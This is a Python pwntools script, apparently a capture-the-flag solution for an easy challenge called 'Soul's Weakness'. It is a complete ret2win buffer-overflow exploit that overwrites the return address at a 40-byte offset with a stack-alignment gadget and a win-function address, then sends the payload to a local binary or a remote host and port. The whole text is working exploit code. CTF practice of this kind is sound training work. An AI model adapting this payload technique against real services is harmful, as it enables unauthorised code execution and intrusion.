#!/usr/bin/env python3
"""
Soul's Weakness - Buffer Overflow Ret2Win Exploit
Author: Suyog Jadhav
Category: Binary Exploitation / Pwn (Easy)
"""

import os
from pwn import *

context.arch = 'amd64'

HOST = "145.239.142.129"
PORT = 1337

if args.REMOTE:
    io = remote(HOST, PORT)
else:
    bin_path = "./soul-stone-pwn/challenge/soul" if os.path.exists("./soul-stone-pwn/challenge/soul") else "./soul"
    io = process(bin_path)

# Addresses (No-PIE x86-64)
soul_stone = 0x4011d6
ret_gadget = 0x40101a  # 16-byte stack alignment for glibc movaps

offset = 40
payload = flat({
    offset: [
        ret_gadget,
        soul_stone
    ]
})

io.sendlineafter(b"Enter your name: ", payload)
io.interactive()
